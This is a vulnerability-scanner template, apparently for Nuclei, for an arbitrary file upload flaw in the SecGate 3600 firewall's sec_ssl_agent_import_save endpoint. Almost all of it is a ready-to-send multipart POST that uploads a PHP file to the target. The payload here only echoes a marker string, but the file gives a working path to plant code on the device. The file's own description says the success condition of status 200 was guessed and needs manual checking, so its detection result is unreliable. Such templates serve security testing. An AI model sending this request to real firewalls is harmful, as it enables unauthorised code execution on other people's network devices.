id: poc-ee1f054c19e1629d6231
info:
  name: 网神SecGata3600防火墙sec_ssl_agent_import_save任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'POST /?g=sec_ssl_agent_import_save HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36

    Content-Length: 343

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Cache-Control: max-age=0

    Connection: close

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEkSeIhsa5fnqB0Zn

    Upgrade-Insecure-Requests: 1

    SL-CE-SUID: 1057


    ------WebKitFormBoundaryEkSeIhsa5fnqB0Zn

    Content-Disposition: form-data; name="reqfile"; filename="2.php"

    Content-Type: text/plain


    <?php echo "testvuln";?>


    ------WebKitFormBoundaryEkSeIhsa5fnqB0Zn

    Content-Disposition: form-data; name="submit_post"


    sec_ssl_agent_import_save

    ------WebKitFormBoundaryEkSeIhsa5fnqB0Zn--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
